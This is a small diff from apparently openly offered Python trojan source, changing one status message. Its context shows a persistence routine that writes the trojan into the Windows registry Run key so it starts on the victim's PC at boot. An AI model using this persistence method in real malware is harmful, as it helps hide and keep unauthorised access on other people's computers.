@@ -361,7 +361,7 @@ class Trojan(threading.Thread):
         the trojan executable, so that the trojan will be available whenever the target pc is running
         :return: (void)
         """
-        self.client.add("[*] attempting to add a autorun routine within the system registry")
+        self.client.add("[*] attempting to add a autorun routine within the system registry\n")
 
         # attempts to create a key in the autorun folder of the registry and write the according value into it
         key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
